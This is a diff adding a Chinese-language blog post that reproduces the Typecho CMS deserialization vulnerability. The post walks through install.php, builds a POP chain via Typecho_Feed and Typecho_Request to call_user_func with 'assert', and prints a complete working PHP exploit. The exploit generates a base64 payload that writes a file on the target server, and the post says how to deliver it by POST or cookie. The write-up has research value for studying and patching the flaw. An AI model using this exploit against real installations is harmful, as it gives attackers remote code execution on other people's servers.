@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>Typecho 反序列化漏洞复现 - P1g3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content="P1g3">
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="P1g3" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+</head></html>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">P1g3</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives" class="menu-item-link">Archives</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/friends" class="menu-item-link">Friends</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">Typecho 反序列化漏洞复现</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-11-22</span>
+  </div>
+  <div class="post-content">
+    <p>漏洞触发点：install.php 230-235 行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));</span><br><span class="line">Typecho_Cookie::delete(&apos;__typecho_config&apos;);</span><br><span class="line">$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br><span class="line">$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">Typecho_Db::set($db);</span><br></pre></td></tr></table></figure>
+<p>第一行执行了一个反序列化的操作，让我们看看他反序列化的数据是否可控，跟进Typecho_Cookie的get方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static function get($key, $default = NULL)</span><br><span class="line">    &#123;</span><br><span class="line">     $key = self::$_prefix . $key;</span><br><span class="line">     $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">     return is_array($value) ? $default : $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里的$key其实就是__typecho_config。</p>
+<p>可以看到先是对key进行拼接，拼接当前类中的<code>$_prefix</code>和<code>$key</code>。</p>
+<p>而默认的<code>$_prefix</code>是空的，所以这里的<code>$key</code>就相当于传进来的<code>$key</code>。</p>
+<p>接着判断cookie中是否存在<code>__typecho_config</code>这个参数，如果存在，则把这个参数的值赋给<code>$value</code>，如果不存在，进入下一个判断。判断post的参数中是否存在<code>__typecho_config</code>，如果存在，则赋值给<code>$value</code>，否则返回空。</p>
+<p>最终判断<code>$value</code>是否为数组，不是就作为调用结果返回。</p>
+<p>可以看出来这里反序列化的数据是我们可控的，于是开始构造pop链。</p>
+<p>反序列化操作一般与魔术方法是捆绑在一起的，因为反序列化会触发一些魔术方法，这些方法中如果存在漏洞函数，我们就可以进行调用，魔术方法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__construct()，类的构造函数</span><br><span class="line"></span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"></span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure></p>
+<p>反序列化后的数据传给<code>$config</code>，接着使用<code>$config</code>数组中的元素作为变量在实例化Typecho_Db时作为参数一同传递进去。</p>
+<p>跟进Typecho_Db类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($adapterName, $prefix = &apos;typecho_&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">        /** 获取适配器名称 */</span><br><span class="line">        $this-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        /** 数据库适配器 */</span><br><span class="line">        $adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName;</span><br><span class="line"></span><br><span class="line">        if (!call_user_func(array($adapterName, &apos;isAvailable&apos;))) &#123;</span><br><span class="line">            throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        /** 初始化内部变量 */</span><br><span class="line">        $this-&gt;_pool = array();</span><br><span class="line">        $this-&gt;_connectedPool = array();</span><br><span class="line">        $this-&gt;_config = array();</span><br><span class="line"></span><br><span class="line">        //实例化适配器对象</span><br><span class="line">        $this-&gt;_adapter = new $adapterName();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>下面这行代码对传进来的参数进行了拼接处理，这里如果我们拼接的是一个类，PHP就会自动调用这个类的ToString()方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName;</span><br></pre></td></tr></table></figure>
+<p>全局搜索ToString()方法，在Typecho_Feed这个类中有可以让我们构造攻击链的代码。</p>
+<p>跟进Feed.php中的ToString()方法（PS：由于代码量大，只取关键部分分析）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foreach ($this-&gt;_items as $item) &#123;</span><br><span class="line">              $content .= &apos;&lt;item&gt;&apos; . self::EOL;</span><br><span class="line">              $content .= &apos;&lt;title&gt;&apos; . htmlspecialchars($item[&apos;title&apos;]) . &apos;&lt;/title&gt;&apos; . self::EOL;</span><br><span class="line">              $content .= &apos;&lt;link&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/link&gt;&apos; . self::EOL;</span><br><span class="line">              $content .= &apos;&lt;guid&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/guid&gt;&apos; . self::EOL;</span><br><span class="line">              $content .= &apos;&lt;pubDate&gt;&apos; . $this-&gt;dateFormat($item[&apos;date&apos;]) . &apos;&lt;/pubDate&gt;&apos; . self::EOL;</span><br><span class="line">              $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL;</span><br></pre></td></tr></table></figure>
+<p>如果我们这里的$item[‘author’]是一个类，而这个类中没有screenName这个成员变量，就会调用__get()方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) .</span><br></pre></td></tr></table></figure>
+<p>而<code>$item</code>是从<code>$this-&gt;_items</code>赋值来的，让我们看看$_items是从哪里来的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private $_items = array();</span><br></pre></td></tr></table></figure>
+<p>在这个类中定义了$_items，我们要记住，只要是类中定义的，我们就可以对它的值进行修改，默认定义的是一个空数组，这里我们可以把他定义成一个含值的数组。</p>
+<p>全局搜索get()方法，在Request.php的Typecho_Request类中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($key)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进get()方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function get($key, $default = NULL)</span><br><span class="line">&#123;</span><br><span class="line">    switch (true) &#123;</span><br><span class="line">        case isset($this-&gt;_params[$key]):</span><br><span class="line">            $value = $this-&gt;_params[$key];</span><br><span class="line">            break;</span><br><span class="line">        case isset(self::$_httpParams[$key]):</span><br><span class="line">            $value = self::$_httpParams[$key];</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            $value = $default;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;</span><br><span class="line">    return $this-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的$key实际上就是<code>screenName</code>，先是判断<code>$this-&gt;_params[$key]</code>的值是否存在，如果存在就把值赋给<code>$value</code>，然后break，而这里的<code>$_params</code>是类中已经定义的一个空数组，所以是我们可控的，进而<code>$value</code>值也是我们可控的，跟进<code>_applyFilter()</code>函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private function _applyFilter($value)</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;_filter) &#123;</span><br><span class="line">        foreach ($this-&gt;_filter as $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;_filter = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先是把上面的<code>$value</code>值传进来，经过判断之后调用call_user_func这个回调函数，利用这个函数我们可以执行任意命令，前提是他的两个参数我们要可控，<code>$value</code>值我们可控，看看<code>$filter</code>，<code>$filter</code>是由<code>$this-&gt;_filter</code>传来的，而<code>$this-&gt;_filter</code>是类中定义的成员变量，也就是说我们是可控的，所以这里我们要的攻击条件就已经全部满足了。</p>
+<p>接下来就可以开始写EXP了：</p>
+<p>先是Typecho_Request这个类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Typecho_Request&#123;</span><br><span class="line">    private $_params = array(&quot;screenName&quot;=&gt;&quot;phpinfo();&quot;);</span><br><span class="line">    private $_filter = array(&quot;assert&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来是Typecho_Feed这个类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Typecho_Feed&#123;</span><br><span class="line"></span><br><span class="line">    const RSS2 = &apos;RSS 2.0&apos;;</span><br><span class="line">    private $_type=&apos;RSS 2.0&apos;;</span><br><span class="line">    private $_items = array();</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this -&gt;_items=array(array(&quot;author&quot;=&gt;new Typecho_Request()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Typecho_Request&#123;</span><br><span class="line">    private $_params = array(&quot;screenName&quot;=&gt;&quot;file_put_contents(&apos;P1g3.php&apos;,&apos;&lt;?php phpinfo();?&gt;&apos;)&quot;);</span><br><span class="line">    private $_filter = array(&quot;assert&quot;);</span><br><span class="line">&#125;</span><br><span class="line">class Typecho_Feed&#123;</span><br><span class="line"></span><br><span class="line">    const RSS2 = &apos;RSS 2.0&apos;;</span><br><span class="line">    private $_type=&apos;RSS 2.0&apos;;</span><br><span class="line">    private $_items = array();</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this -&gt;_items=array(array(&quot;author&quot;=&gt;new Typecho_Request()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = array(&quot;adapter&quot;=&gt;new Typecho_Feed());</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($exp));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>先解释一下，这里要设置$_type和RSS2的原因是： <code>else if (self::RSS2 == $this-&gt;_type)</code> 。</p>
+<p>这是一个写入文件的EXP，写入文件的内容是phpinfo();。</p>
+<p>这里我们需要令finish参数不为空，因为有这么一行代码：<code>&lt;?php if (isset($_GET[&#39;finish&#39;])) : ?&gt;</code>。</p>
+<p><img src="./QQ截图20181122152131.jpg" alt="Alt text"></p>
+<p>所以我们最终只需要finish参数不为空，POST传一下我们的EXP即可，这里的EXP可以从POST传也可以从cookie传，只是POST方便点。</p>
+
+  </div>
+  <div class="post-footer">
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2018
+  <span class="author">
+    P1g3
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
